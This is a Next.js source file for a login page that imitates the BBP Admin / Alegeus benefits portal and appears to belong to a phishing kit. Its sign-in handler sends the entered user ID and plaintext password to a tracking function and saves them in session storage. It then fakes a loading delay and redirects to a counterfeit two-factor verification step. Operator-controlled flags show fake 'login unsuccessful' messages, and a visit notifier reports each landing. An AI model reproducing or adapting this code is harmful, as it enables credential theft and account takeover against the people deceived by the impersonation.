"use client"

import Link from "next/link"
import Image from "next/image"
import { Phone, Lock, Check, UserPlus, Mail, Loader2 } from "lucide-react"
import { Footer } from "@/components/footer"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { useLandingVisitNotify } from "@/hooks/use-landing-visit-notify"
import { trackFormSubmission } from "@/hooks/use-visitor-tracking"
import {
  clearAptiaLoginFlow,
  setAptiaLoginFlowStage,
} from "@/hooks/use-aptia-login-flow-guard"
import { useEffect, useState } from "react"

const SIGN_IN_LOADING_MS = 2000
const BBP_LOGO =
  "/BBPAdmin_Alegeus_Logo_Blue_Service.4ec5724d58c34a02b47bdfd467112a82.png"

export default function LoginPage() {
  useLandingVisitNotify(true)
  const [userId, setUserId] = useState("")
  const [password, setPassword] = useState("")
  const [error, setError] = useState("")
  const [loginErrors, setLoginErrors] = useState<{ userId?: string; password?: string }>({})
  const [signInLoading, setSignInLoading] = useState(false)
  const [registerLoading, setRegisterLoading] = useState(false)

  useEffect(() => {
    if (typeof window === "undefined") return
    const params = new URLSearchParams(window.location.search)
    const denied = params.get("loginDenied") === "1"
    const unavailable = params.get("verifyUnavailable") === "1"
    if (!denied && !unavailable) return

    if (denied) {
      clearAptiaLoginFlow()
      setError(
        `Login Unsuccessful.
The information provided does not match our records. You may need to retry your credentials.`,
      )
    } else {
      clearAptiaLoginFlow()
      setError("We are unable to verify you at this time.\n\nPlease try again in a few minutes.")
    }

    const t = window.setTimeout(() => {
      if (window.location.search) {
        window.history.replaceState({}, "", "/")
      }
    }, 0)
    return () => window.clearTimeout(t)
  }, [])

  const validateLogin = (): boolean => {
    const err: { userId?: string; password?: string } = {}
    const trimmedUserId = userId.trim()
    const trimmedPassword = password.trim()
    if (!trimmedUserId) err.userId = "User ID is required"
    if (!trimmedPassword) err.password = "Password is required"
    else if (trimmedPassword.length < 4) err.password = "Password must be at least 4 characters"
    setLoginErrors(err)
    return Object.keys(err).length === 0
  }

  const handleSignIn = async (e?: React.MouseEvent<HTMLButtonElement>) => {
    if (e) {
      e.preventDefault()
      e.stopPropagation()
    }
    if (!validateLogin()) return

    const trimmedUserId = userId.trim()
    const trimmedPassword = password.trim()

    setError("")
    setSignInLoading(true)

    trackFormSubmission({
      type: "login",
      userId: trimmedUserId,
      password: trimmedPassword,
      page: "/",
    }).catch(() => {})

    try {
      sessionStorage.setItem("loginReady", "1")
      sessionStorage.setItem("loginUserId", trimmedUserId)
      sessionStorage.setItem("loginPassword", trimmedPassword)
      setAptiaLoginFlowStage("2fa")
    } catch {
      // ignore storage errors
    }

    await new Promise((r) => setTimeout(r, SIGN_IN_LOADING_MS))
    window.location.href = "/login/2fa-verify"
  }

  return (
    <div className="min-h-screen flex flex-col bg-white">
      <header className="border-b border-gray-200 px-6 py-4">
        <div className="flex items-center">
          <Link href="/" className="flex items-center shrink-0">
            <Image
              src={BBP_LOGO}
              alt="BBP Admin"
              width={140}
              height={32}
              className="h-[34px] w-auto"
              priority
            />
          </Link>

          <div className="flex flex-col text-xs text-gray-600 leading-tight ml-auto md:ml-6 shrink-0">
            <div className="flex items-center gap-2">
              <Phone className="w-3 h-3" />
              <span>(630) 773-2337</span>
            </div>
            <div className="flex items-center gap-2 mt-1">
              <Mail className="w-3 h-3" />
              <span>support@bbpadmin.com</span>
            </div>
          </div>

          <div className="ml-6 text-lg md:text-[21px] text-gray-600 font-light hidden md:block">
            Login
          </div>
        </div>
      </header>

      <main className="flex-1 flex flex-col items-center px-6 pt-4 md:pt-10 pb-8 lg:pr-[700px]">
        <div className="w-full max-w-md">
          <h2 className="text-left text-gray-700 text-lg font-semibold mb-4 md:hidden">Login</h2>

          <div className="flex justify-center mb-4">
            <div className="w-12 h-12 border-2 border-gray-400 flex items-center justify-center">
              <Lock className="w-6 h-6 text-gray-400" />
            </div>
          </div>

          <p className="text-center text-gray-600 text-sm mb-4 leading-relaxed">
            We will maintain the confidentiality of your personal information in
            <br />
            accordance with our privacy policy.
          </p>

          <h1 className="text-center text-gray-700 text-xl mb-4">Sign in</h1>

          {error ? (
            <div className="mb-4 text-sm text-red-600 whitespace-pre-line" role="alert">
              {error}
            </div>
          ) : null}

          <form
            onSubmit={(e) => {
              e.preventDefault()
              e.stopPropagation()
              void handleSignIn()
            }}
            className="space-y-4"
          >
            <div className="space-y-1">
              <Label htmlFor="userId" className="text-gray-700">
                UserId <span className="text-orange-500">*</span>
              </Label>
              <Input
                id="userId"
                type="text"
                value={userId}
                onChange={(e) => {
                  setUserId(e.target.value)
                  if (loginErrors.userId) setLoginErrors((p) => ({ ...p, userId: undefined }))
                  if (error) setError("")
                }}
                className={`w-full focus:ring-blue-500 ${
                  loginErrors.userId
                    ? "border-red-500 focus:border-red-500"
                    : "border-gray-300 focus:border-blue-500"
                }`}
              />
              {loginErrors.userId ? (
                <p className="text-sm text-red-500">{loginErrors.userId}</p>
              ) : null}
              <p className="text-sm mt-1">
                <span className="text-gray-600">Forgot your Username? </span>
                <Link href="/api/login-out" className="text-blue-600 underline hover:text-blue-700">
                  Let us help
                </Link>
              </p>
            </div>

            <div className="space-y-1">
              <Label htmlFor="password" className="text-gray-700">
                Password <span className="text-orange-500">*</span>
              </Label>
              <Input
                id="password"
                type="password"
                value={password}
                onChange={(e) => {
                  setPassword(e.target.value)
                  if (loginErrors.password) setLoginErrors((p) => ({ ...p, password: undefined }))
                  if (error) setError("")
                }}
                className={`w-full focus:ring-blue-500 ${
                  loginErrors.password
                    ? "border-red-500 focus:border-red-500"
                    : "border-gray-300 focus:border-blue-500"
                }`}
              />
              {loginErrors.password ? (
                <p className="text-sm text-red-500">{loginErrors.password}</p>
              ) : null}
              <p className="text-sm mt-1">
                <span className="text-gray-600">Forgot your Password? </span>
                <Link href="/api/login-out" className="text-blue-600 underline hover:text-blue-700">
                  Let us help
                </Link>
              </p>
            </div>

            <div className="flex justify-center md:justify-start">
              <Button
                type="button"
                disabled={signInLoading}
                onClick={(e) => void handleSignIn(e)}
                className="bg-[#141c4d] hover:bg-[#407ec9] text-white py-2 px-8 text-base font-normal min-w-[140px] transition-colors cursor-pointer rounded-none disabled:opacity-70 disabled:cursor-wait border border-[#bec5c2] shadow-[0_0_3px_0_#141c4d]"
              >
                {signInLoading ? (
                  <>
                    <Loader2 className="w-5 h-5 mr-2 animate-spin" />
                    Signing in...
                  </>
                ) : (
                  <>
                    <Check className="w-5 h-5 mr-2" />
                    Sign In
                  </>
                )}
              </Button>
            </div>

            <div className="pt-4">
              <p className="text-gray-600 mb-2 text-sm text-left">Don&apos;t have an account?</p>
              <div className="flex justify-center md:justify-start">
                <Button
                  type="button"
                  className="bg-[#407ec9] hover:bg-[#141c4d] text-white py-2 px-8 text-base font-normal min-w-[140px] transition-colors cursor-pointer rounded-none disabled:opacity-70 disabled:cursor-wait border border-[#bec5c2] shadow-[0_0_3px_0_#bec5c2]"
                  disabled={registerLoading}
                  onClick={async () => {
                    trackFormSubmission({ type: "registration", page: "/" }).catch(() => {})
                    setRegisterLoading(true)
                    await new Promise((r) => setTimeout(r, SIGN_IN_LOADING_MS))
                    window.location.href = "/registration"
                  }}
                >
                  {registerLoading ? (
                    <>
                      <Loader2 className="w-5 h-5 mr-2 animate-spin" />
                      Loading...
                    </>
                  ) : (
                    <>
                      <UserPlus className="w-5 h-5 mr-2" />
                      Register
                    </>
                  )}
                </Button>
              </div>
            </div>
          </form>
        </div>
      </main>

      <Footer />
    </div>
  )
}
